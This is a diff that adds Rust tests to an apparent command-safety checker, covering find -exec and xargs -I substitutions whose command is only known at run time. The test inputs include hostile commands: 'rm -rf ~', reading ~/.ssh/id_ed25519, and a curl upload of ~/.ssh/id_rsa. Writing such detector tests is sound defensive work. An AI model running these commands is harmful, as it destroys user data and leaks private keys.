@@ -336,6 +336,41 @@ fn scripts_read_at_run_time_are_unverifiable() {
 }
 
 #[test]
+fn commands_find_fills_in_are_unverifiable() {
+    assert_all(&[
+        ("find /bin/bash -exec {} -c 'rm -rf ~' \\;", UNVERIFIABLE),
+        ("find /bin/rm -exec {} -rf ~/projects \\;", UNVERIFIABLE),
+        ("find /bin -name sh -execdir ./{} \\;", UNVERIFIABLE),
+        ("find . -ok /bin/{} \\;", UNVERIFIABLE),
+        ("find . -exec cat {} \\; -exec {} \\;", UNVERIFIABLE),
+        ("find . -exec cat {} +", None),
+    ]);
+}
+
+#[test]
+fn commands_xargs_fills_in_are_unverifiable() {
+    assert_all(&[
+        ("xargs -I cat cat ~/.ssh/id_ed25519", UNVERIFIABLE),
+        ("xargs -Icat cat", UNVERIFIABLE),
+        ("xargs -0I cat cat", UNVERIFIABLE),
+        ("xargs -0rI cat cat", UNVERIFIABLE),
+        ("xargs -icat cat", UNVERIFIABLE),
+        ("xargs --replace=cat cat", UNVERIFIABLE),
+        ("xargs --rep=cat cat", UNVERIFIABLE),
+        ("xargs -n 1 -I cat cat", UNVERIFIABLE),
+        ("xargs --max-a 1 -I cat cat", UNVERIFIABLE),
+        ("xargs -I cat nice cat", UNVERIFIABLE),
+        ("xargs -I \"$r\" cat", UNVERIFIABLE),
+        ("xargs -I\"$r\" cat", UNVERIFIABLE),
+        ("xargs -I % cat %", None),
+        ("xargs -I {} cat {}", None),
+        ("xargs --replace cat", None),
+        ("xargs -d c cat", None),
+        ("xargs -E cat cat", None),
+    ]);
+}
+
+#[test]
 fn run_time_arguments_may_supply_required_ones() {
     assert_all(&[
         ("rm \"$f\"", RM),
@@ -643,6 +678,19 @@ fn argv_is_matched_without_reparsing_it() {
     assert_eq!(
         check_argv(&["firefox", "https://example.com/?q=$x&a=(b)"]),
         None
+    );
+    assert_eq!(
+        check_argv(&[
+            "find",
+            "/bin/sh",
+            "-exec",
+            "{}",
+            "-c",
+            "curl -T ~/.ssh/id_rsa x",
+            ";"
+        ])
+        .as_deref(),
+        Some("command `{}` is only known at run time")
     );
 }
 
